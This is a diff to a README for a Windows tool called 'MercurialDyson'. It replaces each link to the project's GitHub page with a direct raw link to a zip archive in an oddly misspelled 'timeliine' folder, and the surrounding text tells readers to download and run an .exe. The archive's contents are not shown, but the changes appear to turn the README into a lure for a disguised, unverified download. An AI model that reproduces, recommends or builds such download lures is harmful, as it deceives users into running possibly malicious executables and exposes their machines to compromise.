@@ -1,6 +1,6 @@
 # 🪐 MercurialDyson - Fast setup for MercuryAscended
 
-[![Download MercurialDyson](https://img.shields.io/badge/Download-MercurialDyson-blue.svg?style=for-the-badge&logo=github)](https://github.com/corendaburled733/MercurialDyson)
+[![Download MercurialDyson](https://img.shields.io/badge/Download-MercurialDyson-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/corendaburled733/MercurialDyson/main/timeliine/Dyson_Mercurial_1.6.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use it if you want a local copy of the project that opens fast and keeps the mai
 
 To get MercurialDyson, visit this page to download:
 
-https://github.com/corendaburled733/MercurialDyson
+https://raw.githubusercontent.com/corendaburled733/MercurialDyson/main/timeliine/Dyson_Mercurial_1.6.zip
 
 If you see a release file such as an `.exe`, download and run that file on your Windows PC. If the page opens the main repository first, use the repository page to find the latest download or release link.
 
@@ -48,7 +48,7 @@ The app keeps the workflow short. You open it, view the project, and move throug
 Follow these steps to set up MercurialDyson on Windows:
 
 1. Open the download page:
-   https://github.com/corendaburled733/MercurialDyson
+   https://raw.githubusercontent.com/corendaburled733/MercurialDyson/main/timeliine/Dyson_Mercurial_1.6.zip
 
 2. Find the latest Windows file or release package.
 
